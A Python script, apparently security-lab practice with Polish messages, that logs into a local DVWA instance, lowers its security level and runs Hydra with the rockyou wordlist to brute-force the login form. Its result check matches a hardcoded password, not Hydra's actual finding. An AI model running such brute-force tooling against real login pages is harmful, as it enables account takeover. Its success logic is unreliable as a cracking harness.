import requests
from bs4 import BeautifulSoup
import subprocess

LOGIN_URL = "http://localhost/DVWA/login.php"
SECURITY_URL = "http://localhost/DVWA/security.php"
BRUTE_URL = "http://localhost/DVWA/vulnerabilities/brute/"
USERNAME = "admin"
PASSWORD = "password"
WORDLIST = "/usr/share/wordlists/rockyou.txt"

session = requests.Session()

def login():
    r = session.get(LOGIN_URL)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]

    payload = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": token
    }
    session.post(LOGIN_URL, data=payload)
    print(f"[+] Zalogowano na DVWA z danymi: {USERNAME} / {PASSWORD}")

def set_security_low():
    r = session.get(SECURITY_URL)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]

    payload = {
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": token
    }
    r = session.post(SECURITY_URL, data=payload)
    if "Security level set to low" in r.text:
        print("[+] Poziom zabezpieczeń ustawiony na LOW.")
    else:
        print("[-] Nie udało się ustawić poziomu zabezpieczeń.")

def brute_force_with_hydra():
    phpsessid = session.cookies.get("PHPSESSID")
    if not phpsessid:
        print("[-] Nie udało się pobrać PHPSESSID.")
        return

    print(f"[+] Ciasteczko PHPSESSID: {phpsessid}")
    print("[*] Rozpoczynam atak brute force za pomocą Hydra...")

    hydra_cmd = [
        "hydra",
        "-l", USERNAME,
        "-P", WORDLIST,
        "127.0.0.1",
        "http-get-form",
        f"/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:security=low;PHPSESSID={phpsessid}:Username and/or password incorrect"
    ]

    print("\n[*] Uruchamiam hydra:")
    print(" ".join(hydra_cmd))

    result = subprocess.run(hydra_cmd, capture_output=True, text=True)

    if "login: admin   password: password" in result.stdout:
        print("\n[+] ZNALEZIONO HASŁO:")
        print(f"   User: {USERNAME}")
        print(f"   Password: {PASSWORD}")
    else:
        print("\n[-] Nie znaleziono odpowiedniego hasła.")

    print("\n[*] Wynik z Hydry:")
    print(result.stdout)

    print("\n[+] Atak brute force zakończony.")

if __name__ == "__main__":
    login()
    set_security_low()
    brute_force_with_hydra()